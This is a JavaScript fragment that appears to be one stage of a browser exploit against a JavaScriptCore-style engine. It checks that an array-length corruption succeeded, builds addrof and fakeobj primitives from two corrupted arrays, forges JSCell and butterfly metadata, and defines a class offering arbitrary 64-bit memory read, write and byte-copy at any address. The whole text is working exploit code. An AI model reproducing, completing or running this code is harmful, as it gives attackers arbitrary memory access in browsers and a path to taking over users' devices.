stages.push(() => {
    if (corruptedACounterpart.length != 0x1A) {
        throw new Error(`Trigger failed (0x${corruptedACounterpart.length.toString(16)})`);
    }
    printf(`fastMalloc leaked into array length [0x${corruptedACounterpart.length.toString(16)}]`, 2);
    primitives = {
        addrof: (value) => {
            corruptedBCounterpart[0] = value;
            return Int64.fromDouble(corruptedACounterpart[0x1A]);
        },
        fakeobj: (address) => {
            corruptedACounterpart[0x1A] = address.asDouble(); // Have trust ;)
            return corruptedBCounterpart[0];
        },
    };
    printf(`Created initial primitives [addrof: ${primitives.addrof(primitives.addrof)}, fakeobj: ${primitives.addrof(primitives.fakeobj)}]`);


    let objectMirror = createJSObjectMirror(corruptedA);
    doubleArrayCellHeader = objectMirror.butterflyMetadata.jsCellHeader.sub(0x1).add(0x1000000000);
    printf(`Received doubleArrayCellHeader [${doubleArrayCellHeader}]`);

    objectMirror.butterflyMetadata.jsCellHeader = doubleArrayCellHeader;

    doubleArrayButterfly = objectMirror.butterflyMetadata.butterfly;
    printf(`Received doubleArrayButterfly [${doubleArrayButterfly}]`);

    objectMirror.objectMetadata.butterfly = corruptedB;
    objectMirror.butterflyMetadata.jsCellHeader = doubleArrayCellHeader;

    objectMirror.objectMetadata.jsCellHeader = doubleArrayCellHeader.sub(kBoxedDoubleOffset);

    primitives = new(class {

        constructor() {
            // Try to move state into class
            this.mirror = objectMirror;
            this.readWriteContiguous = corruptedBCounterpart;
            this.readWriteDoubles = corruptedACounterpart;
            this.originalButterfly = doubleArrayButterfly;    
            this.setSharedButterfly(this.originalButterfly);
            printf(`Set shared butterfly [newButterfly: ${this.originalButterfly}]`, 2);
        }

        guardAddress(address) { // Will return an Int64 cuz like bruh
            switch (typeof address) {
                case 'number':
                    if (!((address % 2) == 0)) {
                        address = Int64.fromDouble(address);
                    } else {
                        address = new Int64(address); // Totally a valid number :troll:
                    }
                    return address;
                case 'object':
                    if (address instanceof Int64)
                        return address;
                default:
                    throw new Error(`Invalid type passed to primitives: ${typeof address}`);
            }
        }

        setSharedButterfly(newButterfly) {
            for (let i = 0; i < 2; i++) { // Needs to go twice to properly set for whatever reason.
                this.mirror.objectMetadata.butterfly = this.readWriteContiguous;
                this.mirror.butterflyMetadata.butterfly = newButterfly;
                this.mirror.objectMetadata.butterfly = this.readWriteDoubles;
                this.mirror.butterflyMetadata.butterfly = newButterfly;
            }
        }

        resetButterfly() {
            this.setSharedButterfly(this.originalButterfly);
        }

        addrof(object) {
            this.readWriteContiguous[0] = object;
            return Int64.fromDouble(this.readWriteDoubles[0]);
        }

        fakeobj(address) {
            address = this.guardAddress(address);
            corruptedACounterpart[0] = address.asDouble();
            return corruptedBCounterpart[0];
        }

        read64(where, offset = 0) {
            where = this.guardAddress(where);
            where = Add(where, 8 * offset);
            this.setSharedButterfly(where);
            let retval = Int64.fromDouble(corruptedACounterpart[0]);
            this.resetButterfly();
            return retval;
        }

        write64(where, what, offset = 0) {
            where = this.guardAddress(where);
            where = Add(where, 8 * offset);
            this.setSharedButterfly(where);
            corruptedBCounterpart[0] = what;
            this.resetButterfly();
            return;
        }

        copyTo(address, dataArray, length, offset = 0) {
            address = this.guardAddress(address);
            let chunkCount = calculateChunkCount(length);
            if (dataArray instanceof Uint8Array) {
                let currentDataArrayPos = 0;
                for (var i = 0; i < chunkCount; i++) {
                    let pointer = Add(Add(address, offset), i * 8);
                    let chunk = this.read64(pointer);
                    for (var j = 0; j < 8 && currentDataArrayPos < length; j++) {
                        chunk.bytes[j] = dataArray[currentDataArrayPos];
                        currentDataArrayPos++;
                    }
                    this.write64(pointer, chunk.sub(0x2000000000000).asDouble());
                }
            } else {
                throw new TypeError("copyTo requires the data to be of type 'Uint8Array'");
            }
        }

        copyFrom(address, length, offset = 0) {
            address = this.guardAddress(address);
            let chunkCount = calculateChunkCount(length);
            let chunks = [];
            let byteBuffer = [];
            for (var i = 0; i < chunkCount; i++) {
                chunks[i] = this.read64(Add(Add(address, offset), i * 8));
            }
            for (let chunk of chunks) {
                let totalBytes = 0;
                for (var i = 0; i < 8; i++) {
                    totalBytes++
                    byteBuffer.push(chunk.bytes[i]);
                    if (totalBytes == length) break;
                }
            }
            let ret = new Uint8Array(byteBuffer);
            return ret;
        }
    });
});